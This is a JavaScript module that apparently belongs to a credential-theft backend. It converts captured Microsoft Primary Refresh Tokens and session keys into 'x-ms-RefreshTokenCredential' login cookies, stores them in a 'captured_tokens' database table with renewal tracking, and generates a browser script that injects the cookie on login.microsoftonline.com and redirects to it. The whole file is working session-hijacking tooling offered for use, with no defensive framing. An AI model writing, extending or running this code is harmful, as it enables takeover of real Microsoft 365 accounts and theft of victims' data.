'use strict';

const db = require('../database/connection');
const config = require('../config/env');
const { encrypt } = require('../utils/encrypt');
const prtkdf = require('./prtkdf');

function detectAccountType(email) {
  if (!email) return 'work_school';
  const domain = String(email).split('@')[1]?.toLowerCase() || '';
  if (['outlook.com', 'hotmail.com', 'live.com', 'passport.com', 'msn.com'].includes(domain)) {
    return 'personal';
  }
  return 'work_school';
}

function normalizeAccountType(accountType, email) {
  if (accountType && accountType !== 'unknown') return accountType;
  return detectAccountType(email);
}

async function resolveSessionKeyForUser(userId, tenant) {
  if (!userId || !tenant) return null;

  try {
    const [rows] = await db.query(
      'SELECT session_key_encrypted FROM device_credentials WHERE user_id = ? AND tenant_id = ? ORDER BY id DESC LIMIT 1',
      [userId, tenant]
    );

    if (!rows.length || !rows[0].session_key_encrypted) return null;

    const { decrypt } = require('../utils/encrypt');
    return decrypt(rows[0].session_key_encrypted);
  } catch (err) {
    return null;
  }
}

function parsePrtAndSessionKey(inputToken) {
  if (!inputToken) return { prt: null, sessionKey: null };

  if (typeof inputToken === 'object') {
    return {
      prt: inputToken.prt || inputToken.primary_refresh_token || null,
      sessionKey: inputToken.sessionKey || inputToken.session_key || inputToken.session_key_jwe || null,
    };
  }

  if (typeof inputToken === 'string') {
    const trimmed = inputToken.trim();
    if (!trimmed) return { prt: null, sessionKey: null };

    try {
      const parsed = JSON.parse(trimmed);
      if (parsed && typeof parsed === 'object') {
        return parsePrtAndSessionKey(parsed);
      }
    } catch (err) {
      // plain PRT string
    }

    return { prt: trimmed, sessionKey: null };
  }

  return { prt: null, sessionKey: null };
}

async function buildGraphSpyPrtCookie(prt, sessionKey) {
  if (!prt) {
    throw new Error('No PRT available for GraphSpy cookie generation');
  }
  if (!sessionKey) {
    throw new Error('No PRT session key available for GraphSpy cookie generation');
  }

  const nonceResult = await prtkdf.getSrvChallengeNonce();
  const nonce = typeof nonceResult === 'string' ? nonceResult : nonceResult && nonceResult.nonce ? nonceResult.nonce : null;

  if (!nonce) {
    throw new Error('Unable to fetch srv_challenge nonce for GraphSpy PRT cookie');
  }

  return prtkdf.buildPrtCookieJwt(prt, sessionKey, nonce);
}

function generatePrtCookieInjectionScript(prtCookie, host) {
  const target = (host || 'login.microsoftonline.com').replace(/^https?:\/\//, '').replace(/\/+$/, '');

  return [
    '(function () {',
    `  document.cookie = "x-ms-RefreshTokenCredential=${prtCookie}; domain=.${target}; path=/; Secure; SameSite=None";`,
    `  console.log("[GraphSpy] PRT cookie set on .${target}");`,
    `  window.location.href = "https://${target}/";`,
    '})();'
  ].join('\n');
}

async function convertTokensToCookies(inputToken, templateType, tenant, email, accountType, userId) {
  const resolvedType = normalizeAccountType(accountType, email);
  const { prt, sessionKey: providedSessionKey } = parsePrtAndSessionKey(inputToken);

  if (!prt) {
    return {
      success: false,
      error: 'No PRT available. Keep only the GraphSpy PRT path.',
      cookies: null,
    };
  }

  let sessionKey = providedSessionKey || (userId && tenant ? await resolveSessionKeyForUser(userId, tenant) : null);

  if (!sessionKey) {
    return {
      success: false,
      error: 'No PRT session key stored. Capture the session key first using the GraphSpy PRT flow.',
      cookies: null,
    };
  }

  try {
    const prtCookie = await buildGraphSpyPrtCookie(prt, sessionKey);
    const cookieRecord = {
      name: 'x-ms-RefreshTokenCredential',
      value: prtCookie,
      domain: '.login.microsoftonline.com',
      path: '/',
      secure: true,
      httpOnly: false,
      sameSite: 'None',
      expirationDate: Math.floor(Date.now() / 1000) + 300,
    };

    return {
      success: true,
      cookies: [cookieRecord],
      cookie_count: 1,
      access_token: prt,
      new_refresh_token: prt,
      account_type: resolvedType,
      expires: 'about 5 minutes',
      graphspy_prt_cookie: prtCookie,
    };
  } catch (err) {
    console.error('[CookieConverter] GraphSpy PRT conversion failed:', err.message);
    return {
      success: false,
      error: err.message,
      cookies: null,
    };
  }
}

async function processCookieConversion(tokenId, accessToken, templateType, tenant, accountType, userId) {
  const result = await convertTokensToCookies(accessToken, templateType, tenant, null, accountType, userId);

  if (result.success && result.cookies) {
    const ttlHours = config.COOKIE_MAX_TTL_HOURS || 720;
    await db.query(
      'UPDATE captured_tokens SET cookies_encrypted=?, token_type=?, account_type=?, expiration=DATE_ADD(NOW(),INTERVAL ? HOUR), last_renewed=NOW(), renewal_count=renewal_count+1 WHERE id=?',
      [encrypt(JSON.stringify(result.cookies)), 'cookie', accountType, ttlHours, tokenId]
    );
  }

  return result;
}

module.exports = {
  convertTokensToCookies,
  processCookieConversion,
  detectAccountType,
  generatePrtCookieInjectionScript,
};
